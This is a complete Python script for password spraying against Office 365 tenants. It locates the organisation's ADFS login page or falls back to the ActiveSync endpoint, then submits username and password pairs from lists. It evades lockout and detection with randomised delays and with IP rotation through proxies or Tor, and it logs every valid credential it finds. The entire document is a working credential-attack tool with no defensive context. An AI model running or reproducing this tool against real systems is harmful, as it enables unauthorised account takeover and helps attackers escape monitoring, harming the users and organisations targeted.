#!/usr/bin/python3
import os
import sys
import time
import json
import socks
import socket
import base64
import random
import urllib3
import argparse
import requests
from stem import Signal
from stem.control import Controller
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

active_sync_url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', required=True, default=None, action='store', help='Target url')
	parser.add_argument('-u', '--user', required=False, default=None, action='store', help='User')
	parser.add_argument('-U', '--user_list', required=False, default=None, action='store', help='User list')
	parser.add_argument('-p', '--password', required=False, default=None, action='store', help='Password')
	parser.add_argument('-P', '--password_list', required=False, default=None, action='store', help='Password list')
	parser.add_argument('-m', '--min_time', required=False, default=30, action='store', help='Minimum seconds. Default: 300')
	parser.add_argument('-M', '--max_time', required=False, default=60, action='store', help='Maximum seconds. Default: 600')
	parser.add_argument('-r', '--randomize', required=False, default=True, action='store', help='Randomize pairs of credentials. Default: True')
	parser.add_argument('-n', '--number_requests_per_ip', required=False, default=1, action='store', help='Number of requests per IP address. Default: 1')
	parser.add_argument('-l', '--logfile', required=False, default="tested.txt", action='store', help='Log file. Default: tested.txt')
	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: False')
	parser.add_argument('-pl', '--proxy_list', required=False, default=None, action='store', help='Proxy list')
	parser.add_argument('-tp', '--tor_password', required=False, default=None, action='store', help='Tor password')
	parser.add_argument('-UP', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
	return parser


def write_tested(user,password,test_credentials_file,status,ip_):
	current_time = time.strftime("%H:%M:%S",time.localtime())
	#current_ip = requests.get('https://api.ipify.org').text.replace("\n","")
	current_ip = ip_
	with open(test_credentials_file, "a") as f:
		f.write(user+":"+password+","+status+","+current_time+","+current_ip+"\n")


def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counter,pairs, ip_):
	if "dafs" in dafs_url:
		origin_field  = dafs_url.split("adfs")[0]
	else:
		origin_field  = dafs_url
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin": origin_field,
		"Referer": dafs_url,
		"Connection": "close"
	}
	user = credential[0]
	password = credential[1]
	data = {"UserName": user, "Password": password, "AuthMethod":"FormsAuthentication"}
	resp = requests.post(dafs_url, data = data, headers = headers, verify = False, proxies = proxy)
	if resp.history != []:
		write_tested(user,password,test_credentials_file, "CORRECT",ip_)
		print("[%s/%s] CORRECT credentials found: %s:%s"%(counter,pairs,user,password))
		return True
	elif resp.history == []:
		write_tested(user,password,test_credentials_file, "FAILED",ip_)
		if debug: print("[%s/%s] Incorrect credentials: %s:%s"%(counter,pairs,user,password))
		return False
	if resp.status_code != 200:
		print ("[!] Strange status code: %s. Quitting!!!"%(resp.status_code))
		sys.exit(1)


def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,pairs, ip_):
	user = credential[0]
	password = credential[1]
	s = requests.Session()
	s.get(active_sync_url)
	authorization = base64.b64encode(str(user+":"+password).encode()).decode("utf-8")
	headers = {'Authorization': 'Basic '+authorization, 'Upgrade-Insecure-Requests': '1', 'Accept-Language': 'en-US,en;q=0.5'}
	response = s.get(active_sync_url, headers = headers, verify = False, proxies = proxy)
	if debug: print("[%s/%s] Response status code: %s" % (counter,pairs,response.status_code))
	if response.status_code == 200 or response.status_code == 505:
		print("[%s/%s] CORRECT credentials found: %s:%s"%(counter,pairs,user,password))
		write_tested(user,password,test_credentials_file,"CORRECT",ip_)
		return True
	else:
		if debug: print("[%s/%s] Incorrect credentials: %s:%s"%(counter,pairs,user,password))
		write_tested(user,password,test_credentials_file,"FAILED",ip_)
		return False


def calculate_values(target):
	s = requests.Session()
	url = "https://login.microsoftonline.com/common/userrealm/?user=test@"+target+"&api-version=2.1&checkForMicrosoftAccount=true"
	headers = None
	response = s.get(url)
	json_data = json.loads(response.text)
	if 'AuthURL' in json_data:
		print("[+] Organization uses a customized sign-in page")
		dafs_url = s.get(json_data['AuthURL']).url #json_data['AuthURL']
	elif (json_data['NameSpaceType'] == "Managed"):
		print("[!] Organization does not use a customized sign-in page. \n[!] Using Microsoft Server ActiveSync")
		dafs_url = active_sync_url
	else:
		print("[!] Error. Organization probably does not use Office 365.")
		print("[-] Response from login.microsoftonline.com:")
		print(json.dumps(json_data, indent=4, sort_keys=True))
		sys.exit(1)
	return dafs_url


def change_tor_ip(controller, debug):
	try:
		controller.signal(Signal.NEWNYM)
		time.sleep(controller.get_newnym_wait())
	except:
		print("[!] Error changing IP address using Tor")
		pass
	new_ip = requests.get('https://api.ipify.org').text.replace("\n","")
	if "Application Error" in new_ip:
		new_ip = "Error_Getting_Ip" 
	return new_ip


def main():
	# Get arguments
	args = get_args().parse_args()
	if (args.user is None and args.user_list is None and args.userpassword_list is None) or (args.password is None and args.password_list is None and args.userpassword_list is None):
		dafs_url = calculate_values(args.target)
		print ("[+] ADFS url: %s"%(dafs_url))
		print ("[+] Please provide user (-u), password (-p), User list (-U), Password list (-P) or User:Password list (-UP) to carry out an attack.")
		#get_args().print_help()
		sys.exit(0)
	if (args.user_list is not None and not os.path.isfile(args.user_list)):
		print ("[!] Error: Use '-U' with a file of users or '-u' for a single user")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("[!] Error: Use '-P' with a file of passwords or '-p' for a single password")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("[!] Error: Use '-UP' with a file of usernames and passwords with the format username:password")
		sys.exit(0)

	# Create variables
	if args.userpassword_list is None:
		users =      [args.user] if args.user is not None else open(args.user_list).read().splitlines()
		passwords =  [args.password] if args.password is not None else open(args.password_list).read().splitlines()
		pairs =      [(u,p) for u in users for p in passwords]
	else:
		creds =      list(filter(None,[c for c in open(args.userpassword_list).read().splitlines()]))
		users =      [c.split(":")[0] for c in creds]
		passwords =  [c.split(":")[1] for c in creds]
		pairs =      [(c.split(":")[0],c.split(":")[1]) for c in creds]


	proxy_list = open(args.proxy_list).read().splitlines() if args.proxy_list is not None else None
	tor_password = args.tor_password if args.tor_password is not None else None
	debug =      json.loads(args.debug.lower()) if isinstance(args.debug,str) else args.debug
	randomize =  json.loads(args.randomize.lower()) if isinstance(args.randomize,str) else args.randomize
	number_requests_per_ip = int(args.number_requests_per_ip)

	# Delete already tested pairs of username and password
	test_credentials_file = args.logfile
	if os.path.isfile(test_credentials_file):
		tested_pairs = open(test_credentials_file).read().splitlines()
		tested_pairs = [(p.split(",")[0].split(":")[0], p.split(",")[0].split(":")[1]) for p in tested_pairs]
		pairs =        [p for p in pairs if p not in tested_pairs]

	# Randomize the combination of users and passwords
	if randomize:
		random.shuffle(pairs)

	# Get DAFS url and create a web session
	new_ip = ""
	if tor_password is not None:
		try:
			controller = Controller.from_port(port=9051)
			controller.authenticate(password=tor_password)
			socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
			socket.socket = socks.socksocket
		except:
			pass
		if debug: print("[+] Changing IP address")
		new_ip = change_tor_ip(controller, debug)
		if debug: print("[+] New IP address: %s"%(new_ip))

	dafs_url = calculate_values(args.target)

	if debug:
		print ("[+] ADFS url: %s"%(dafs_url))
		print ("[+] Total users:         %d"   %(len(users)))
		print ("[+] Total passwords:     %d"   %(len(passwords)))
		print ("[+] Total combinations:  %d\n"   %(len(pairs)))
		#print ("[+] External IP address: %s\n" %(requests.get('https://api.ipify.org').text.replace("\n","")))

	counter = 0
	correct_users_list = []
	proxy = None
	for credential in pairs:
		if credential[0] not in correct_users_list:
			counter += 1
			random_seconds = random.randint(int(args.min_time), int(args.max_time))
			if proxy_list is not None and ((counter) % number_requests_per_ip == 0):
				proxy = {"http": proxy_list[counter%len(proxy_list)], "https": proxy_list[counter%len(proxy_list)]}
			if tor_password is not None and ((counter) % number_requests_per_ip == 0):
				try:
					controller = Controller.from_port(port=9051)
					controller.authenticate(password=tor_password)
					socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
					socket.socket = socks.socksocket
				except:
					pass
				#if debug: print("[%s/%s] Changing IP address"%(str(counter), str(len(pairs))))
				new_ip = change_tor_ip(controller, debug)
				if debug: print("[%s/%s] New IP address: %s"%(str(counter), str(len(pairs)), new_ip))
			if debug: print("[%s/%s] Waiting time:   %s seconds"%(str(counter), str(len(pairs)),random_seconds))
			time.sleep(random_seconds)
			#if debug: print("[%s/%s] Testing %s:%s"%(str(counter), str(len(pairs)),credential[0], credential[1]))
			if dafs_url != active_sync_url:
				correct_user = check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip)
			else:
				correct_user = check_activesync_user(credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip)
			if correct_user:
				correct_users_list.append(credential[0])


if __name__== "__main__":
	main()
